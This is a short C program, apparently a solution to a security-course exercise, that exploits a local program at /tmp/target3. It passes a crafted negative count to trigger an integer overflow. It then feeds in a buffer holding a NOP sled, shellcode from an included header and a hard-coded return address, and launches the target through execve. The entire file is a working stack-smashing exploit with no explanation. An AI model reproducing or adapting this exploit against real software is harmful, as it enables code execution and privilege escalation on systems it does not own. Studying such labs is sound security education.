#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOP 0x90
int main(void)
{
  char *args[3];
  char *env[1];
  
  char buf[20032];
  int i;
  int addr;
  char *count;
  
  addr = 0xbfff6208;
  count = "-2147482647";

  strncpy(buf, count, 11);
  buf[11] = ',';
  for (i=12; i<20012-strlen(shellcode); i++){
    buf[i] = NOP;
  }
  strncpy(buf+20012-strlen(shellcode), shellcode, strlen(shellcode));
  for (i=20012; i<20016; i++){
    buf[i] = NOP;
  }
  *(int*)(buf+20016) = addr;
  for(i=20020; i<20032; i++){
    buf[i] = 0x00;
  }

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;
  
 // printf("\n args[1] is %s \n", args[1]);
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
